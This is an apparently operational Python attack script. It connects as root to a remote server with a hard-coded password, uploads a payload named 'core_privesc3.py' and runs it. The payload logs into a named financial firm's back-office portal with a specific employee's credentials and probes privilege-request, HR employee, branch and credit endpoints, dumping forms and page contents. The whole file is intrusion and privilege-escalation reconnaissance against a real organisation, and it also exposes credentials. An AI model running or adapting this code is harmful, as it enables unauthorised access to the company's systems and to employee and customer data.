import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

# LOGIN
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""
r = s.post("https://core.findep.mx/valida.do",
    data={"cve_idToken": tok, "msjPass": "", "cveUsr": "jcruzval",
          "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Entrar"},
    allow_redirects=True, timeout=15)
sys.stdout.write(f"Login: {len(r.text)}b\n\n")

if len(r.text) < 15000:
    sys.stdout.write("LOGIN FAILED\n")
    sys.exit(1)

# ====================================================
# 1. Try privilege request endpoints directly
# ====================================================
sys.stdout.write("="*60 + "\n=== PRIVILEGE REQUEST ENDPOINTS ===\n" + "="*60 + "\n\n")

priv_endpoints = [
    ("GET", "solicitar_privilegio.do", {}),
    ("POST", "solicitar_privilegio.do", {"id_aef": "1"}),
    ("POST", "solicitar_privilegio.do", {"id_aef": "jcruzval"}),
    ("GET", "solicitar_privilegio_cambio.do", {}),
    ("POST", "solicitar_privilegio_cambio.do", {"caso_uso": "1", "caso_uso_sel": "1"}),
    ("GET", "agregar_privilegio_cambio.do", {}),
    ("POST", "agregar_privilegio_cambio.do", {"solicita": "1"}),
    ("POST", "agregar_privilegio_cambio.do", {"solicita": "finanzas"}),
    ("GET", "insertar_sol_priv.do", {}),
    ("POST", "insertar_sol_priv.do", {}),
    ("GET", "aut_sol_priv.do", {}),
    ("POST", "aut_sol_priv.do", {}),
    ("GET", "rec_sol_priv.do", {}),
]

for method, path, data in priv_endpoints:
    try:
        url = f"https://core.findep.mx/backoffice/{path}"
        if method == "GET":
            r = s.get(url, timeout=10, allow_redirects=False)
        else:
            r = s.post(url, data=data, timeout=10, allow_redirects=False)
        
        size = len(r.text)
        # Skip the 1149 generic error and 6668 empresas popup
        if size not in [1149, 1071] and r.status_code != 404:
            sys.stdout.write(f"  [{r.status_code}] {method} {path} ({size}b)\n")
            
            # Extract useful data
            title = re.search(r'<title>(.*?)</title>', r.text[:2000])
            if title:
                sys.stdout.write(f"    Title: {title.group(1)}\n")
            
            forms = re.findall(r'<form[^>]*(?:action="([^"]*)")?[^>]*(?:name="([^"]*)")?', r.text)
            if forms and any(f[0] or f[1] for f in forms):
                sys.stdout.write(f"    Forms: {[(a,n) for a,n in forms if a or n]}\n")
            
            selects = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r.text, re.S)
            for sel_name, sel_body in selects:
                options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
                sys.stdout.write(f"    Select '{sel_name}': {options[:20]}\n")
            
            inputs = re.findall(r'<input[^>]+name="([^"]+)"(?:[^>]+value="([^"]*)")?', r.text)
            if inputs:
                sys.stdout.write(f"    Inputs: {inputs[:15]}\n")
            
            # If large page, dump more
            if size > 3000:
                sys.stdout.write(f"    Body[0:2000]: {r.text[:2000]}\n")
            elif size > 100:
                sys.stdout.write(f"    Body: {r.text[:1000]}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR {path}: {e}\n")
    sys.stdout.flush()

# ====================================================
# 2. RH module — search for employee list / IDs
# ====================================================
sys.stdout.write("\n" + "="*60 + "\n=== RH MODULE EXPLORATION ===\n" + "="*60 + "\n\n")

rh_paths = [
    ("/rh/rh_index.do", "GET", {}),
    ("/rh/recibo_busqueda.do", "GET", {}),
    ("/rh/recibo_busqueda.do", "POST", {"cve_emp": "jcruzval"}),
    ("/rh/empleado_busqueda.do", "GET", {}),
    ("/rh/empleado_busqueda.do", "POST", {"cve_emp": "jcruzval"}),
    ("/rh/empleado_con.do", "GET", {}),
    ("/rh/directorio.do", "GET", {}),
    ("/rh/lista_empleados.do", "GET", {}),
    ("/rh/consulta_empleado.do", "GET", {}),
]

for path, method, data in rh_paths:
    try:
        url = f"https://core.findep.mx{path}"
        if method == "GET":
            r = s.get(url, timeout=10, allow_redirects=False)
        else:
            r = s.post(url, data=data, timeout=10, allow_redirects=False)
        
        if r.status_code != 404 and len(r.text) not in [1071, 1149]:
            sys.stdout.write(f"  [{r.status_code}] {method} {path} ({len(r.text)}b)\n")
            
            title = re.search(r'<title>(.*?)</title>', r.text[:2000])
            if title:
                sys.stdout.write(f"    Title: {title.group(1)}\n")
            
            # Look for employee data
            emp_refs = re.findall(r'(?:empleado|nombre|clave|numero|id_emp|cve_emp|id_aef)[^<]{0,150}', r.text, re.I)
            if emp_refs:
                sys.stdout.write(f"    Employee refs: {emp_refs[:10]}\n")
            
            selects = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r.text, re.S)
            for sel_name, sel_body in selects:
                options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
                sys.stdout.write(f"    Select '{sel_name}': {options[:15]}\n")
            
            inputs = re.findall(r'<input[^>]+name="([^"]+)"(?:[^>]+value="([^"]*)")?', r.text)
            if inputs:
                sys.stdout.write(f"    Inputs: {inputs[:15]}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR {path}: {e}\n")
    sys.stdout.flush()

# ====================================================
# 3. Sucursales — enumerate branches
# ====================================================
sys.stdout.write("\n=== SUCURSALES ===\n")
r = s.get("https://core.findep.mx/sucursales/sucursales_index.do", timeout=10)
sys.stdout.write(f"[{r.status_code}] ({len(r.text)}b)\n")
# Extract links
do_links = re.findall(r'(?:href|action)=["\']([^"\']*\.do[^"\']*)["\']', r.text)
sys.stdout.write(f"  .do links: {do_links[:20]}\n")
# Look for branch data
branches = re.findall(r'(?:sucursal|branch|oficina|plaza|region)[^<]{0,200}', r.text, re.I)
sys.stdout.write(f"  Branch refs: {branches[:10]}\n")

# ====================================================
# 4. Credits module — solicitud de credito
# ====================================================
sys.stdout.write("\n=== CREDITOS ===\n")
cred_paths = [
    "/inicio/solicitud_credito.do",
    "/inicio/busqueda_cliente.do",
    "/inicio/cliente_busqueda.do",
    "/creditos/creditos_index.do",
    "/creditos/solicitud.do",
    "/creditos/busqueda.do",
]
for p in cred_paths:
    try:
        r = s.get(f"https://core.findep.mx{p}", timeout=8, allow_redirects=False)
        if r.status_code != 404 and len(r.text) not in [1071, 1149]:
            sys.stdout.write(f"  [{r.status_code}] {p} ({len(r.text)}b)\n")
            title = re.search(r'<title>(.*?)</title>', r.text[:2000])
            if title:
                sys.stdout.write(f"    Title: {title.group(1)}\n")
            selects = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r.text, re.S)
            for sel_name, sel_body in selects:
                options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
                sys.stdout.write(f"    Select '{sel_name}' ({len(options)}): {options[:10]}\n")
    except:
        pass
    sys.stdout.flush()

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/core_privesc3.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/core_privesc3.py 2>&1', timeout=180)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
